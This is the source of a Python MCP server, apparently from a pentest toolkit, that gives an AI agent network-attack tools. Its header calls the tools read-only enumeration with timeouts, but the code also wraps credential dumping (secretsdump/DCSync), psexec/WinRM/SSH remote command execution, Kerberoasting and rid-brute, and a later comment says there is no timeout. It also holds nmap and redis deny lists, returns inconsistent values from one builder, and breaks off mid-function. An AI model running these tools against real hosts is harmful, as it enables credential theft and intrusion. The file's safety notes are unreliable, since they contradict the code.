#!/usr/bin/env python3
# PurrSh3ll — hacktools MCP server
# Copyright (C) 2024-2025  PurrSh3ll Contributors
#
# A dependency-free Model Context Protocol (MCP) server (JSON-RPC 2.0 over stdio,
# newline-delimited) exposing a CURATED set of SAFE, target-only enumeration tools
# from the offensive toolkit — the same class of tools purragent uses in its
# service-exploitation phase, but here as standalone MCP tools for normal (non-hack)
# mode. Design notes:
#
#   * Safe by default: only read/enumeration tools. No brute-force, no cracking, no
#     relay/poison/listener tools, no reverse shells — those stay manual.
#   * No shell: every tool builds an argv list (never shell=True), so a hostname can
#     never inject a command. Inputs are validated (host chars, port range).
#   * Single target: a CIDR / subnet (anything with '/') is rejected, so a tool can't
#     silently widen scope to a whole network.
#   * Honest about availability: if the underlying binary isn't installed, the tool
#     returns a clear '[not installed]' message instead of a transport error.
#   * Time-budgeted: every call has a timeout; partial output is kept on timeout.
#
# Run it directly and it waits for JSON-RPC on stdin:
#     python3 hacktools_server.py
# Quick smoke test without a client:
#     python3 hacktools_server.py --selftest

import json
import os
import re
import shutil
import subprocess
import sys
from urllib.parse import quote

PROTOCOL_VERSION = "2024-11-05"
SERVER_NAME = "purr-hacktools"
SERVER_VERSION = "0.1.0"

# No per-tool timeout here on purpose: the server runs each command to completion and
# the CALLING AGENT decides how long to wait (and kills the call if it takes too long).
# Keeping timeout policy in one place — the agent — avoids two layers disagreeing.
MAX_OUTPUT = 8000             # chars returned to the model (keeps replies readable)


# --------------------------------------------------------------------------- #
# Input validation + command runner
# --------------------------------------------------------------------------- #
_HOST_RE = re.compile(r"^[A-Za-z0-9._:-]+$")     # ipv4 / ipv6 / hostname chars
_PORTS_RE = re.compile(r"^[0-9,\-]+$")           # 80  |  22,80,443  |  1-1024
_ANSI_RE = re.compile(r"\x1b(?:\[[0-9;?]*[ -/]*[@-~]|\][^\x07]*\x07)")   # colour codes


def _req_host(args):
    """A single validated target host (no CIDR / subnet)."""
    host = (args.get("host") or "").strip()
    if not host:
        raise ValueError("`host` is required")
    if "/" in host:
        raise ValueError("`host` must be a single host, not a CIDR/subnet")
    if not _HOST_RE.match(host):
        raise ValueError("`host` has invalid characters")
    return host


def _port(args, default=None):
    p = args.get("port", default)
    if p is None:
        return None
    try:
        n = int(p)
    except (TypeError, ValueError):
        raise ValueError("`port` must be a number")
    if not 1 <= n <= 65535:
        raise ValueError("`port` must be 1-65535")
    return n


def _ports(args):
    p = (str(args.get("ports") or "")).replace(" ", "")
    if not p:
        return None
    if not _PORTS_RE.match(p):
        raise ValueError("`ports` must be like 80 or 22,80,443 or 1-1024")
    return p


def _word(args, key, required=True):
    v = (args.get(key) or "").strip()
    if not v and required:
        raise ValueError(f"`{key}` is required")
    return v


def _is_root():
    try:
        return os.geteuid() == 0
    except AttributeError:                             # non-POSIX
        return False


_URL_RE = re.compile(r"^https?://[^\s]+$", re.I)


def _req_url(a, key="url"):
    """A validated http(s) URL (required)."""
    url = (a.get(key) or "").strip()
    if not url:
        raise ValueError(f"`{key}` is required")
    if not _URL_RE.match(url) or re.search(r"[\x00-\x1f]", url):
        raise ValueError(f"`{key}` must be an http(s) URL")
    return url


def _no_ctrl(v, key):
    if re.search(r"[\x00-\x1f]", v):
        raise ValueError(f"`{key}` has control characters")
    return v


# Preset wordlists for content discovery → the first path that exists on the box.
_WORDLISTS = {
    "common": ["/usr/share/seclists/Discovery/Web-Content/common.txt",
               "/usr/share/wordlists/dirb/common.txt"],
    "medium": ["/usr/share/seclists/Discovery/Web-Content/"
               "directory-list-2.3-medium.txt"],
    "big": ["/usr/share/seclists/Discovery/Web-Content/big.txt",
            "/usr/share/wordlists/dirb/big.txt"],
    "raft": ["/usr/share/seclists/Discovery/Web-Content/"
             "raft-medium-directories.txt"],
}


def _resolve_wordlist(name):
    for p in _WORDLISTS.get(name, []):
        if os.path.exists(p):
            return p
    return None


# Subdomain/DNS wordlists for vhost fuzzing.
_DNS_WORDLISTS = {
    "small": ["/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"],
    "large": ["/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt"],
    "common": ["/usr/share/seclists/Discovery/DNS/namelist.txt",
               "/usr/share/wordlists/dnsmap.txt"],
}


def _resolve_dns_wordlist(name):
    for p in _DNS_WORDLISTS.get(name, []):
        if os.path.exists(p):
            return p
    return None


# ── credentials (batch 2) ─────────────────────────────────────────────────────
def _creds(a, require=False):
    """(username, password, nthash, domain) — validated so they can't break the
    argv/target-spec formats. password/hash are optional (null session), unless
    `require` demands a username."""
    user = (a.get("username") or "").strip()
    password = str(a.get("password") if a.get("password") is not None else "")
    nthash = (a.get("hash") or "").strip()
    domain = (a.get("domain") or "").strip()
    if require and not user:
        raise ValueError("`username` is required for this tool")
    if user and not re.match(r"^[^\s:/@\\%]+$", user):
        raise ValueError("`username` has invalid characters")
    if domain and not re.match(r"^[A-Za-z0-9._-]+$", domain):
        raise ValueError("`domain` has invalid characters")
    if nthash and not re.match(r"^[0-9a-fA-F:]{16,}$", nthash):
        raise ValueError("`hash` must be an NT hash (hex) or LM:NT")
    if re.search(r"[\x00-\x1f]", password):
        raise ValueError("`password` has control characters")
    return user, password, nthash, domain


def _hashes_arg(nthash):
    """impacket -hashes wants LMHASH:NTHASH; a bare NT hash becomes :NT."""
    return nthash if ":" in nthash else ":" + nthash


def _impacket_target(domain, user, password, host, with_pass=True):
    """impacket target spec: [domain/]user[:password]@host."""
    dpart = (domain + "/") if domain else ""
    if with_pass and password:
        return f"{dpart}{user}:{password}@{host}"
    return f"{dpart}{user}@{host}"


def _nxc_auth(user, password, nthash, domain):
    out = (["-d", domain] if domain else []) + ["-u", user or ""]
    return out + (["-H", nthash] if nthash else ["-p", password])


def _run(argv, binary):
    """Run one argv (no shell) to completion and return (text, is_error). Reports a
    missing tool cleanly. There is deliberately no timeout here — the calling agent
    controls how long to wait and kills the call if it runs too long."""
    if not shutil.which(binary):
        return (f"[not installed] '{binary}' is not on PATH — install it to use "
                "this tool.", True)
    try:
        proc = subprocess.run(argv, capture_output=True, text=True,
                              stdin=subprocess.DEVNULL)
    except Exception as exc:                          # noqa: BLE001
        return (f"error running {binary}: {exc}", True)
    out = ((proc.stdout or "") + (proc.stderr or "")).strip()
    out = _ANSI_RE.sub("", out) or "(no output)"
    return (out[:MAX_OUTPUT], False)


_NSE_DENY = ("brute", "dos", "exploit")               # never run these NSE categories


def _nmap_tuning(a):
    """Shared nmap knobs for every scan tool: timing (T0-T5) and whether to ping
    first (host_discovery=false → -Pn). Returns the flag list to splice into argv."""
    timing = (a.get("timing") or "T4").upper()
    if not re.match(r"^T[0-5]$", timing):
        raise ValueError("`timing` must be T0-T5")
    flags = ["-" + timing]
    if not bool(a.get("host_discovery")):
        flags.append("-Pn")                            # assume the host is up
    return flags


# --------------------------------------------------------------------------- #
# Tool builders — each returns (argv, binary) or raises ValueError
# --------------------------------------------------------------------------- #
_RANGE_PORTS = {"fast": ["--top-ports", "1000"], "top100": ["--top-ports", "100"],
                "low": ["-p", "1-32767"], "high": ["-p", "32768-65535"],
                "full": ["-p-"]}


def _b_port_discovery(a):
    host = _req_host(a)
    ports = _ports(a)
    rng = (a.get("range") or "fast").lower()
    proto = (a.get("protocol") or "tcp").lower()
    timing = (a.get("timing") or "T4").upper()
    host_disc = bool(a.get("host_discovery"))
    if rng not in _RANGE_PORTS:
        raise ValueError("`range` must be fast/top100/low/high/full")
    if proto not in ("tcp", "udp", "both"):
        raise ValueError("`protocol` must be tcp/udp/both")
    if not re.match(r"^T[0-5]$", timing):
        raise ValueError("`timing` must be T0-T5")
    root = _is_root()
    if proto in ("udp", "both") and not root:
        raise ValueError("udp/both scans need root — run as root or use "
                         "protocol=tcp")
    scan_flags = {"tcp": ["-sS" if root else "-sT"], "udp": ["-sU"],
                  "both": ["-sS", "-sU"]}[proto]
    argv = ["nmap"] + scan_flags + ["-n", "--open", "-" + timing]
    if not host_disc:
        argv.append("-Pn")                            # assume the host is up
    argv += (["-p", ports] if ports else _RANGE_PORTS[rng])   # explicit ports win
    argv.append(host)
    slow = rng == "full" or proto in ("udp", "both")
    return argv, "nmap"


def _b_service_discovery(a):
    host = _req_host(a)
    ports = _ports(a)
    proto = (a.get("protocol") or "tcp").lower()
    timing = (a.get("timing") or "T4").upper()
    host_disc = bool(a.get("host_discovery"))
    scripts = a.get("scripts", True)
    os_det = bool(a.get("os"))
    intensity = a.get("intensity")
    if proto not in ("tcp", "udp", "both"):
        raise ValueError("`protocol` must be tcp/udp/both")
    if not re.match(r"^T[0-5]$", timing):
        raise ValueError("`timing` must be T0-T5")
    root = _is_root()
    if proto in ("udp", "both") and not root:
        raise ValueError("udp/both scans need root — run as root or use "
                         "protocol=tcp")
    if os_det and not root:
        raise ValueError("os detection (-O) needs root — run as root or set os=false")
    argv = ["nmap", "-sV"]
    argv += {"tcp": ["-sS" if root else "-sT"], "udp": ["-sU"],
             "both": ["-sS", "-sU"]}[proto]
    if scripts:
        argv.append("-sC")                            # default NSE scripts
    if os_det:
        argv.append("-O")
    if intensity is not None:
        try:
            iv = int(intensity)
        except (TypeError, ValueError):
            raise ValueError("`intensity` must be 0-9")
        if not 0 <= iv <= 9:
            raise ValueError("`intensity` must be 0-9")
        argv += ["--version-intensity", str(iv)]
    argv += ["-n", "--open", "-" + timing]
    if not host_disc:
        argv.append("-Pn")
    argv += (["-p", ports] if ports else ["--top-ports", "1000"])
    argv.append(host)
    slow = proto in ("udp", "both") or os_det
    return argv, "nmap"


def _b_script_scan(a):
    host, ports = _req_host(a), _ports(a)
    scripts = _word(a, "scripts")
    if any(bad in scripts.lower() for bad in _NSE_DENY):
        raise ValueError("brute / dos / exploit scripts are not allowed here")
    argv = ["nmap", "-sV", "-n"] + _nmap_tuning(a) + ["--script", scripts]
    argv += (["-p", ports] if ports else [])
    return argv + [host], "nmap"


def _b_http_headers(a):
    host = _req_host(a)
    port = _port(a)
    scheme = "https" if (a.get("tls") or port in (443, 8443)) else "http"
    netloc = f"{host}:{port}" if port else host
    path = (a.get("path") or "/").strip()
    if not path.startswith("/"):
        path = "/" + path
    if re.search(r"[\s\x00-\x1f]", path):
        raise ValueError("`path` has invalid characters")
    method = (a.get("method") or "head").lower()
    if method not in ("head", "get"):
        raise ValueError("`method` must be head or get")
    argv = ["curl", "-sS", "-k", "--max-time", "20"]
    argv += ["-I"] if method == "head" else ["-D", "-", "-o", os.devnull]
    if a.get("follow_redirects"):
        argv.append("-L")
    ua = (a.get("user_agent") or "").strip()
    if ua:
        if re.search(r"[\x00-\x1f]", ua):
            raise ValueError("`user_agent` has control characters")
        argv += ["-A", ua]
    return argv + [f"{scheme}://{netloc}{path}"], "curl"


def _b_ftp_anon(a):
    host = _req_host(a)
    port = _port(a, 21)
    return (["nmap", "-n"] + _nmap_tuning(a)
            + ["-p", str(port), "--script", "ftp-anon", host], "nmap")


def _b_smb_enum(a):
    host = _req_host(a)
    return (["nmap", "-n"] + _nmap_tuning(a)
            + ["-p", "139,445", "--script",
               "smb-os-discovery,smb-security-mode,smb2-security-mode,"
               "smb-enum-shares,smb-enum-users", host], "nmap")


def _b_snmp_walk(a):
    host = _req_host(a)
    community = _word(a, "community", required=False) or "public"
    if not re.match(r"^[A-Za-z0-9._-]+$", community):
        raise ValueError("`community` has invalid characters")
    version = str(a.get("version") or "2c").lower()
    if version not in ("1", "2c"):
        raise ValueError("`version` must be 1 or 2c")
    port = _port(a, 161)
    oid = (a.get("oid") or "").strip()
    if oid and not re.match(r"^[A-Za-z0-9._:-]+$", oid):
        raise ValueError("`oid` has invalid characters")
    argv = ["snmpwalk", "-v1" if version == "1" else "-v2c", "-c", community,
            "-t", "5", f"{host}:{port}"]
    if oid:
        argv.append(oid)                              # walk a specific subtree
    return argv, "snmpwalk"


def _b_dns(a):
    name = _word(a, "name")
    if not _HOST_RE.match(name):
        raise ValueError("`name` has invalid characters")
    rtype = (a.get("type") or "A").upper()
    if rtype not in ("A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA", "PTR", "ANY"):
        raise ValueError("unsupported record `type`")
    argv = ["dig", "+short"]
    server = (a.get("server") or "").strip()
    if server:                                        # query a specific resolver
        if not _HOST_RE.match(server):
            raise ValueError("`server` has invalid characters")
        argv.append("@" + server)
    return argv + [name, rtype], "dig"


def _b_ssl_cert(a):
    host = _req_host(a)
    port = _port(a, 443)
    return (["nmap", "-n"] + _nmap_tuning(a)
            + ["-p", str(port), "--script", "ssl-cert", host], "nmap")


def _b_banner(a):
    host, port = _req_host(a), _port(a)
    if port is None:
        raise ValueError("`port` is required")
    return (["nmap", "-sV", "-n"] + _nmap_tuning(a)
            + ["-p", str(port), "--script", "banner", host], "nmap")


def _b_searchsploit(a):
    query = (a.get("query") or "").strip()
    cve = (a.get("cve") or "").strip()
    if not query and not cve:
        raise ValueError("provide `query` or `cve`")
    argv = ["searchsploit"]                # colour auto-disables when output is piped
    if a.get("title"):
        argv.append("-t")                             # match the title only
    if cve:
        if not re.match(r"^(CVE-)?\d{4}-\d{3,7}$", cve, re.I):
            raise ValueError("`cve` must look like CVE-2017-0144 or 2017-0144")
        argv += ["--cve", cve.upper().replace("CVE-", "")]
    if query:
        argv += query.split()
    return argv, "searchsploit"


def _b_whois(a):
    domain = _word(a, "domain")
    if not _HOST_RE.match(domain):
        raise ValueError("`domain` has invalid characters")
    argv = ["whois"]
    server = (a.get("server") or "").strip()
    if server:                                        # query a specific whois server
        if not _HOST_RE.match(server):
            raise ValueError("`server` has invalid characters")
        argv += ["-h", server]
    return argv + [domain], "whois"


# ── web batch ─────────────────────────────────────────────────────────────────
def _b_http_request(a):
    url = _req_url(a)
    method = (a.get("method") or "GET").upper()
    if method not in ("GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH"):
        raise ValueError("unsupported `method`")
    argv = ["curl", "-sS", "-i", "-k", "--max-time", "30", "-X", method]
    for h in (a.get("headers") or []):
        argv += ["-H", _no_ctrl(str(h), "headers")]
    cookie = (a.get("cookie") or "").strip()
    if cookie:
        argv += ["-b", _no_ctrl(cookie, "cookie")]
    user = (a.get("username") or "").strip()
    if user:                                          # HTTP basic auth
        argv += ["-u", f"{user}:{a.get('password') or ''}"]
    bearer = (a.get("bearer") or "").strip()
    if bearer:
        argv += ["-H", "Authorization: Bearer " + _no_ctrl(bearer, "bearer")]
    data = a.get("data")
    if data not in (None, ""):
        argv += ["--data", str(data)]
    if a.get("follow_redirects"):
        argv.append("-L")
    ua = (a.get("user_agent") or "").strip()
    if ua:
        argv += ["-A", _no_ctrl(ua, "user_agent")]
    return argv + [url], "curl"


def _b_web_content(a):
    url = _req_url(a)
    if "FUZZ" not in url:
        url = url.rstrip("/") + "/FUZZ"
    name = (a.get("wordlist") or "common").lower()
    if name not in _WORDLISTS:
        raise ValueError("`wordlist` must be common/medium/big/raft")
    wl = _resolve_wordlist(name)
    if not wl:
        raise ValueError(f"wordlist '{name}' not found — install seclists or dirb")
    try:
        threads = int(a.get("threads", 40))
    except (TypeError, ValueError):
        raise ValueError("`threads` must be a number")
    if not 1 <= threads <= 100:
        raise ValueError("`threads` must be 1-100")
    argv = ["ffuf", "-u", url, "-w", wl, "-t", str(threads), "-s",
            "-mc", "200,204,301,302,307,401,403,405"]
    exts = (a.get("extensions") or "").strip()
    if exts:
        if not re.match(r"^[A-Za-z0-9,.]+$", exts):
            raise ValueError("`extensions` must be like php,txt,html")
        argv += ["-e", exts]
    return argv, "ffuf"


def _b_whatweb(a):
    url = _req_url(a)
    argv = ["whatweb", "--color=never", "--no-errors"]
    agg = a.get("aggression")
    if agg is not None:
        try:
            av = int(agg)
        except (TypeError, ValueError):
            raise ValueError("`aggression` must be 1-4")
        if not 1 <= av <= 4:
            raise ValueError("`aggression` must be 1-4")
        argv += ["-a", str(av)]
    return argv + [url], "whatweb"


def _b_nikto(a):
    host = _req_host(a)
    port = _port(a, 80)
    argv = ["nikto", "-ask", "no", "-h", host, "-p", str(port)]
    if a.get("tls") or port in (443, 8443):
        argv.append("-ssl")
    return argv, "nikto"


def _b_nuclei(a):
    url = _req_url(a)
    argv = ["nuclei", "-u", url, "-silent", "-nc"]
    sev = (a.get("severity") or "").strip().lower()
    if sev:
        if not re.match(r"^[a-z,]+$", sev):
            raise ValueError("`severity` must be like low,medium,high,critical")
        argv += ["-severity", sev]
    tags = (a.get("tags") or "").strip().lower()
    if tags:
        if not re.match(r"^[a-z0-9,_-]+$", tags):
            raise ValueError("`tags` has invalid characters")
        argv += ["-tags", tags]
    return argv, "nuclei"


# ── SMB / AD batch (credentialed) ─────────────────────────────────────────────
def _b_smb_client(a):
    host = _req_host(a)
    user, password, nthash, domain = _creds(a)
    action = (a.get("action") or "list").lower()
    share = (a.get("share") or "").strip()
    path = (a.get("path") or "").strip()
    if share and not re.match(r"^[A-Za-z0-9._$ -]+$", share):
        raise ValueError("`share` has invalid characters")
    if path and re.search(r"[;\x00-\x1f]", path):
        raise ValueError("`path` has invalid characters")
    if not user:
        auth = ["-N"]                                 # null session
    else:
        userspec = f"{domain}\\{user}" if domain else user
        if nthash:
            auth = ["-U", f"{userspec}%{nthash}", "--pw-nt-hash"]
        else:
            auth = ["-U", f"{userspec}%{password}"]
    if action == "list":
        return ["smbclient", "-L", f"//{host}/"] + auth, "smbclient"
    if action == "ls":
        if not share:
            raise ValueError("`share` is required for action=ls")
        return (["smbclient", f"//{host}/{share}"] + auth
                + ["-c", "ls " + (path or "\\")], "smbclient")
    raise ValueError("`action` must be list or ls")


_NXC_ACTIONS = {"shares": ["--shares"], "users": ["--users"], "groups": ["--groups"],
                "rid": ["--rid-brute"], "sessions": ["--sessions"],
                "disks": ["--disks"], "loggedon": ["--loggedon-users"],
                "passpol": ["--pass-pol"]}


def _b_nxc_smb(a):
    host = _req_host(a)
    user, password, nthash, domain = _creds(a)
    action = (a.get("action") or "shares").lower()
    argv = ["nxc", "smb", host] + _nxc_auth(user, password, nthash, domain)
    if action == "exec":
        cmd = _word(a, "command")
        if re.search(r"[\x00-\x1f]", cmd):
            raise ValueError("`command` has control characters")
        argv += ["-x", cmd]
    elif action in _NXC_ACTIONS:
        argv += _NXC_ACTIONS[action]
    else:
        raise ValueError("`action` must be one of shares/users/groups/rid/sessions/"
                         "disks/loggedon/passpol/exec")
    return argv, "nxc"


def _b_ldap_search(a):
    host = _req_host(a)
    user, password, nthash, domain = _creds(a)
    base = (a.get("base_dn") or "").strip()
    if base and not re.match(r"^[A-Za-z0-9=,. _-]+$", base):
        raise ValueError("`base_dn` has invalid characters")
    lfilter = (a.get("filter") or "(objectClass=*)").strip()
    if re.search(r"[\x00-\x1f]", lfilter):
        raise ValueError("`filter` has control characters")
    port = _port(a, 389)
    argv = ["ldapsearch", "-x", "-H", f"ldap://{host}:{port}"]
    if user:                                          # else anonymous simple bind
        argv += ["-D", f"{user}@{domain}" if domain else user, "-w", password]
    if base:
        argv += ["-b", base]
    argv.append(lfilter)
    attrs = (a.get("attributes") or "").strip()
    if attrs:
        if not re.match(r"^[A-Za-z0-9,]+$", attrs):
            raise ValueError("`attributes` must be comma-separated names")
        argv += attrs.split(",")
    return argv, "ldapsearch"


def _b_rpc_enum(a):
    host = _req_host(a)
    user, password, nthash, domain = _creds(a)
    cmds = (a.get("commands") or "enumdomusers;enumdomgroups;querydominfo").strip()
    if not re.match(r"^[A-Za-z0-9;_ .-]+$", cmds):
        raise ValueError("`commands` has invalid characters")
    if user:
        userspec = f"{domain}\\{user}" if domain else user
        auth = ["-U", f"{userspec}%{password}"]
    else:
        auth = ["-N", "-U", ""]                       # null session
    return ["rpcclient"] + auth + ["-c", cmds, host], "rpcclient"


def _b_secretsdump(a):
    host = _req_host(a)
    user, password, nthash, domain = _creds(a, require=True)
    target = _impacket_target(domain, user, password, host, with_pass=not nthash)
    argv = ["impacket-secretsdump", target]
    if nthash:
        argv += ["-hashes", _hashes_arg(nthash)]
    if a.get("just_dc"):
        argv.append("-just-dc")                       # DCSync-only (fast, DC creds)
    return argv, "impacket-secretsdump"


_IMPACKET_EXEC = {"wmiexec": "impacket-wmiexec", "psexec": "impacket-psexec",
                  "smbexec": "impacket-smbexec", "atexec": "impacket-atexec"}


def _b_impacket_exec(a):
    host = _req_host(a)
    user, password, nthash, domain = _creds(a, require=True)
    method = (a.get("method") or "wmiexec").lower()
    if method not in _IMPACKET_EXEC:
        raise ValueError("`method` must be wmiexec/psexec/smbexec/atexec")
    command = _word(a, "command")
    if re.search(r"[\x00-\x1f]", command):
        raise ValueError("`command` has control characters")
    target = _impacket_target(domain, user, password, host, with_pass=not nthash)
    argv = [_IMPACKET_EXEC[method], target]
    if nthash:
        argv += ["-hashes", _hashes_arg(nthash)]
    argv.append(command)                              # single command, non-interactive
    return argv, _IMPACKET_EXEC[method], 300


def _b_kerberos_roast(a):
    dc = (a.get("dc") or a.get("host") or "").strip()
    if not dc or "/" in dc or not _HOST_RE.match(dc):
        raise ValueError("`dc` (domain controller host/IP) is required")
    domain = (a.get("domain") or "").strip()
    if not domain or not re.match(r"^[A-Za-z0-9._-]+$", domain):
        raise ValueError("`domain` is required (e.g. corp.local)")
    user, password, nthash, _d = _creds(a)
    mode = (a.get("mode") or "kerberoast").lower()
    if mode == "kerberoast":
        if not user:
            raise ValueError("kerberoast needs credentials (username + password/hash)")
        argv = ["impacket-GetUserSPNs", f"{domain}/{user}:{password}",
                "-dc-ip", dc, "-request"]
        if nthash:
            argv += ["-hashes", _hashes_arg(nthash)]
        return argv, "impacket-GetUserSPNs", 300
    if mode == "asrep":
        if user:                                      # authenticated: list AS-REP-able
            argv = ["impacket-GetNPUsers", f"{domain}/{user}:{password}",
                    "-dc-ip", dc, "-request", "-format", "hashcat"]
            if nthash:
                argv += ["-hashes", _hashes_arg(nthash)]
            return argv, "impacket-GetNPUsers", 300
        target_user = (a.get("target_user") or "").strip()
        if not target_user or not re.match(r"^[^\s:/@\\%]+$", target_user):
            raise ValueError("AS-REP without creds needs `target_user`")
        return (["impacket-GetNPUsers", f"{domain}/{target_user}", "-dc-ip", dc,
                 "-no-pass", "-format", "hashcat"], "impacket-GetNPUsers", 300)
    raise ValueError("`mode` must be kerberoast or asrep")


# ── databases + remote exec batch ─────────────────────────────────────────────
def _db_ident(v, key):
    if v and not re.match(r"^[A-Za-z0-9._-]+$", v):
        raise ValueError(f"`{key}` has invalid characters")
    return v


def _b_mysql_query(a):
    host = _req_host(a)
    port = _port(a, 3306)
    user = _db_ident((a.get("username") or "root").strip(), "username")
    password = str(a.get("password") or "")
    db = _db_ident((a.get("database") or "").strip(), "database")
    query = _no_ctrl(_word(a, "query"), "query")
    argv = ["mysql", "-h", host, "-P", str(port), "-u", user]
    if password:
        argv.append("-p" + password)                  # note: visible in process list
    if db:
        argv += ["-D", db]
    return argv + ["-e", query], "mysql"


def _b_mssql_query(a):
    host = _req_host(a)
    user, password, nthash, domain = _creds(a)
    query = _no_ctrl(_word(a, "query"), "query")
    argv = ["nxc", "mssql", host] + _nxc_auth(user, password, nthash, domain)
    if a.get("local_auth"):
        argv.append("--local-auth")                   # SQL login rather than Windows
    if a.get("port") is not None:
        argv += ["--port", str(_port(a))]
    return argv + ["-q", query], "nxc"


def _b_psql_query(a):
    host = _req_host(a)
    port = _port(a, 5432)
    user = _db_ident((a.get("username") or "postgres").strip(), "username")
    password = str(a.get("password") or "")
    db = _db_ident((a.get("database") or "postgres").strip(), "database")
    query = _no_ctrl(_word(a, "query"), "query")
    uri = f"postgresql://{quote(user)}:{quote(password)}@{host}:{port}/{db}"
    return ["psql", uri, "-A", "-c", query], "psql"


_REDIS_DENY = {"SHUTDOWN", "FLUSHALL", "FLUSHDB"}


def _b_redis_cli(a):
    host = _req_host(a)
    port = _port(a, 6379)
    password = str(a.get("password") or "")
    command = (a.get("command") or "INFO").strip()
    if not re.match(r"^[A-Za-z0-9_.:*\- ]+$", command):
        raise ValueError("`command` has invalid characters")
    if command.split()[0].upper() in _REDIS_DENY:
        raise ValueError("destructive redis command not allowed here")
    argv = ["redis-cli", "-h", host, "-p", str(port), "--no-auth-warning"]
    if password:
        argv += ["-a", password]
    return argv + command.split(), "redis-cli"


def _b_mongo_query(a):
    host = _req_host(a)
    port = _port(a, 27017)
    user = (a.get("username") or "").strip()
    password = str(a.get("password") or "")
    db = _db_ident((a.get("database") or "admin").strip(), "database")
    ev = _no_ctrl((a.get("command") or "db.getMongo().getDBNames()").strip(),
                  "command")
    auth = f"{quote(user)}:{quote(password)}@" if user else ""
    uri = f"mongodb://{auth}{host}:{port}/{db}"
    return ["mongosh", uri, "--quiet", "--eval", ev], "mongosh"


def _b_ssh_exec(a):
    host = _req_host(a)
    port = _port(a, 22)
    user = _db_ident((a.get("username") or "").strip(), "username")
    if not user:
        raise ValueError("`username` is required")
    command = _no_ctrl(_word(a, "command"), "command")
    common = ["-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10",
              "-p", str(port), f"{user}@{host}", command]
    key = (a.get("key") or "").strip()
    if key:
        if re.search(r"[;\s\x00-\x1f]", key):
            raise ValueError("`key` must be a path with no spaces")
        return ["ssh", "-i", key] + common, "ssh"
    password = str(a.get("password") or "")
    if password:                                      # non-interactive password auth
        return ["sshpass", "-p", password, "ssh"] + common, "sshpass"
    raise ValueError("provide `password` or `key`")


def _b_winrm_exec(a):
    host = _req_host(a)
    user, password, nthash, domain = _creds(a, require=True)
    command = _no_ctrl(_word(a, "command"), "command")
    argv = ["nxc", "winrm", host] + _nxc_auth(user, password, nthash, domain)
    return argv + ["-x", command], "nxc"


def _b_ftp_transfer(a):
    host = _req_host(a)
    port = _port(a, 21)
    user = (a.get("username") or "anonymous").strip()
    password = str(a.get("password")
                   or ("anonymous" if user == "anonymous" else ""))
    action = (a.get("action") or "list").lower()
    path = _no_ctrl((a.get("path") or "/").strip(), "path")
    if not path.startswith("/"):
        path = "/" + path
    creds = f"{quote(user)}:{quote(password)}@"
    if action == "list":
        if not path.endswith("/"):
            path += "/"
        return (["curl", "-sS", "--max-time", "30",
                 f"ftp://{creds}{host}:{port}{path}", "--list-only"], "curl")
    if action == "get":
        return (["curl", "-sS", "--max-time", "60",
                 f"ftp://{creds}{host}:{port}{path}"], "curl")
    raise ValueError("`action` must be list or get")


# ── recon batch ───────────────────────────────────────────────────────────────
def _b_subdomain_enum(a):
    domain = _word(a, "domain")
    if not _HOST_RE.match(domain):
        raise ValueError("`domain` has invalid characters")
    return ["subfinder", "-d", domain, "-silent"], "subfinder"


def _b_dns_zone_transfer(a):
    domain = _word(a, "domain")
    if not _HOST_RE.match(domain):
        raise ValueError("`domain` has invalid characters")
    ns = (a.get("nameserver") or "").strip()
    if not ns or not _HOST_RE.match(ns):
        raise ValueError("`nameserver` (an NS host/IP to try) is required")
    return ["dig", "axfr", domain, "@" + ns], "dig"


def _b_traceroute(a):
    host = _req_host(a)
    argv = ["traceroute", "-n"]
    hops = a.get("max_hops")
    if hops is not None:
        try:
            h = int(hops)
        except (TypeError, ValueError):
            raise ValueError("`max_hops` must be a number")
        if not 1 <= h <= 64:
            raise ValueError("`max_hops` must be 1-64")
        argv += ["-m", str(h)]
    proto = (a.get("protocol") or "udp").lower()
    if proto in ("icmp", "tcp") and not _is_root():
        raise ValueError(f"{proto} traceroute needs root — use protocol=udp or run "
                         "as root")
    if proto == "icmp":
        argv.append("-I")
    elif proto == "tcp":
        argv.append("-T")
    elif proto != "udp":
        raise ValueError("`protocol` must be udp/icmp/tcp")
    return argv + [host], "traceroute"


def _b_vhost_fuzz(a):
    url = _req_url(a)
    domain = _word(a, "domain")
    if not _HOST_RE.match(domain):
        raise ValueError("`domain` has invalid characters")
    name = (a.get("wordlist") or "small").lower()
    if name not in _DNS_WORDLISTS:
        raise ValueError("`wordlist` must be small/large/common")
    wl = _resolve_dns_wordlist(name)
    if not wl:
        raise ValueError(f"wordlist '{name}' not found — install seclists")
    return (["ffuf", "-u", url, "-H", f"Host: FUZZ.{domain}", "-w", wl, "-ac", "-s"],
            "ffuf")


# ── python-native tools (no external binary; computed in-process, always available) ──
# These builders RETURN THE RESULT TEXT (str, or (str, is_error)) instead of an argv —
# _call_tool detects that and skips the subprocess. Fast, deterministic, dependency-
# free; they cover logic/lookups that CLI tools do poorly.
_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


def _b_hash_identify(a):
    h = _word(a, "hash").strip()
    if re.search(r"\s", h):
        raise ValueError("give one hash at a time")
    guesses, n = [], len(h)
    prefix = {"$2": "bcrypt", "$1$": "md5crypt", "$5$": "sha256crypt",
              "$6$": "sha512crypt", "$y$": "yescrypt", "$7$": "scrypt",
              "{SSHA}": "SSHA (LDAP)", "{SHA}": "SHA1 (LDAP)", "$apr1$": "apache md5",
              "$argon2": "argon2"}
    for p, name in prefix.items():
        if h.startswith(p):
            guesses.append(name)
    if re.fullmatch(r"[0-9a-fA-F]{32}:[0-9a-fA-F]{32}", h):
        guesses.append("LM:NT (NTLM pair)")
    if re.fullmatch(r"\*[0-9A-Fa-f]{40}", h):
        guesses.append("MySQL 4.1+")
    if re.fullmatch(r"[0-9a-fA-F]+", h):
        guesses += {32: ["MD5", "NTLM", "MD4"], 40: ["SHA1"], 56: ["SHA224"],
                    64: ["SHA256"], 96: ["SHA384"], 128: ["SHA512"],
                    16: ["MySQL<4.1", "CRC64"]}.get(n, [])
    guesses = list(dict.fromkeys(guesses)) or ["unknown — check length/charset"]
    return f"length {n}\nlikely: " + ", ".join(guesses)


def _b_jwt_decode(a):
    import base64
    tok = _word(a, "token").strip()
    parts = tok.split(".")
    if len(parts) < 2:
        raise ValueError("not a JWT (need header.payload[.signature])")

    def _seg(s):
        return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
    try:
